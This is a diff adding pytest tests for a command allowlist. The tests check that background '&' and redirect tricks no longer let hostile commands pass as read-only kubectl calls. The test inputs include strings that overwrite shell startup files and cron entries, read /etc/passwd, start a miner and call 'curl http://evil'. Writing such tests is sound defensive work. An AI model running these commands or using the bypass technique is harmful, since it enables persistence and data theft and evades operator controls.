@@ -86,3 +86,37 @@ class TestAllowlistStillWorks:
     def test_unknown_command_default_deny(self):
         assert _check("python script.py")[0] is False
         assert _check("kubectl apply -f deploy.yaml")[0] is False
+
+
+@pytest.mark.unit
+class TestAllowlistMetacharBypass:
+    """Correção pós-revisão #2: bypass residual por `&` simples e redirect.
+
+    A revisão de 2026-11-18 mostrou que a blocklist de composição cobria
+    `&&, ||, ;, |, `, $(` mas NÃO o `&` de background nem redirecionamento
+    `<`/`>` fora de /etc. Como SAFE_PATTERNS casa por prefixo,
+    'kubectl get pods > ~/.bashrc' e 'kubectl get pods & python miner.py'
+    passavam como 'Read-only command'.
+    """
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "kubectl get pods > ~/.bashrc",
+            "kubectl get pods >> /tmp/out",
+            "kubectl get pods < /etc/passwd",
+            "kubectl get pods & python miner.py",
+            "kubectl logs payment-svc & curl http://evil",
+            "kubectl get pods > /etc/cron.d/x",
+            "curl https://example.com > ~/.profile",
+        ],
+    )
+    def test_background_and_redirect_blocked(self, cmd):
+        ok, reason = _check(cmd)
+        assert ok is False, f"bypass não bloqueado: {cmd!r} -> {reason}"
+
+    def test_clean_readonly_still_passes_after_metachar_fix(self):
+        # sanidade: o fix não pode bloquear leitura legítima sem metacaractere
+        ok, reason = _check("kubectl get pods -n production -o wide")
+        assert ok is True
+        assert reason == "Read-only command"
